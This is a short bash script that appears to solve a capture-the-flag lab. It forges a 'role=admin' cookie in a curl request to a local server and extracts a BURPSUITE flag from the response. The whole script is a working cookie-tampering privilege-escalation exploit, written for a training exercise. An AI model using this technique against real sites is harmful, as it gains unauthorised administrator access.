#! /bin/bash

# The server IP address. If not given, use 127.0.0.1 (localhost)
IP=${1:-127.0.0.1}

# The server port. If not given, use 42004
PORT=${2:-42004}

echo "Sending request with role=admin cookie..."

# curl -s sends a GET request with the role cookie set to admin
# grep extracts the flag from the response
FLAG=$(curl -s "http://$IP:$PORT/" \
    --cookie "role=admin" \
    | grep -o "BURPSUITE{[^}]*}")

# If the flag was not found, stop and show an error
if [ -z "$FLAG" ]; then
    echo "Flag not found. Is the server running?"
    exit 1
fi

echo "FLAG: $FLAG"
